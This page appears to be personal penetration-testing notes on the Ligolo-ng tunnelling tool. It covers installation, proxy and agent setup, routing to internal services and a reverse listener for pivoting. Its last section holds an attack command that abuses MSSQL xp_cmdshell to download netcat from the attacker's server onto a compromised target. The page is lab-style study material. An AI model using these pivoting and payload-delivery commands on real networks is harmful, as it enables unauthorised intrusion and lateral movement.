---
title: Ligolo
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentest
  - tunelling
---
# Ligolo

## Installation

Requirements: go.

```
sudo apt install ligolo-ng
```


Or: 

```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

Or:

```
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# And finally you can compile your proxy binary:
go build -o proxy cmd/proxy/main.go
go build -o agent cmd/agent/main.go

#  change the binary in order to be executable:
chmod +x ./agent
chmod +x ./proxy
```


## Basic usage

First, we need to create a tun interface:

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Second, start the proxy:

```
./proxy -selfcert
./ligolo-ng-proxy-linux_amd64 -selfcert 

```

Third, connect the agent (in the pivot machine) to our proxy in the kali:

```
./agent -connect 10.10.14.72:11601 --ignore-cert
.\ligolo-ng-agent-windows_amd64.exe -connect 192.168.45.152:11601 --ignore-cert
```

Once you start the proxy, it listens on the port “11601” by default. So when you connect to your proxy, you need to specify your IP and that default port (unless other configurations are in place).

Commands in ligolo:

```
# List available sessions
session
# To enter one of them, enter the number they have.

# List interfaces:
ifconfig

# Add a route to the new interface (in a new kali terminal)
sudo ip route add 10.10.100.0/24 dev ligolo

# Start the tunnel
start
```


## Building versions

### agent.exe for windows architexture x86

```
cd ligolo-ng/cmd/agent
GOOS=windows GOARCH=386 go build -o agent_x86.exe main.go
```


### proxy for linux architexture amd64

```
cd ligolo-ng/cmd/proxy
GOOS=linux GOARCH=amd64 go build -o proxy main.go
```


## Using ligolo to redirect an internal service

Our kali attacking machine has netowork interface 192.168.45.184. Out target machine is at 192.168.120.246. We gain a foothold at the target and notice an internal website running at 127.0.0.1:8000.  Of course it is not accessible from kali. We need to establish a tunnel and a reverse connection to redirect the 127.0.0.1 traffic to our kali and be able this way to open our browser and browse that internal site.

In our kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

Then we launch the proxy and the agent as usual. The key piece here is:

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

All we have to do now is browse to http://240.0.0.1:8000 from our Kali machine to reach the internal web server running on port 8000.

To remove this redirection:

```
sudo ip route delete 240.0.0.1/32 dev ligolo
```


## Reverse proxy

In this topology:


| my Kali        | pivot machine  | target machine in AD |
| -------------- | -------------- | -------------------- |
| 192.168.10.123 | 192.168.10.200 |                      |
|                | 10.10.10.200   | 10.10.10.14          |

After setting a ligolo agent in the pivot machine and starting the tunel, we achieve to access a service in the target machine. We want to set a rev shell, but the machine does not know how to route the connection back to us. We need to set in the ligolo proxy a listener:

```
ligolo-ng » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
```

Now, lets say, if we have access to this MSQL terminal we can:


```
# in our kali machine
python -m http.server 9999

# In the target machine
EXEC xp_cmdshell 'powershell -c "curl.exe http://$IPpivot:9999/nc64.exe -o C:\Users\Public\nc64.exe"';

```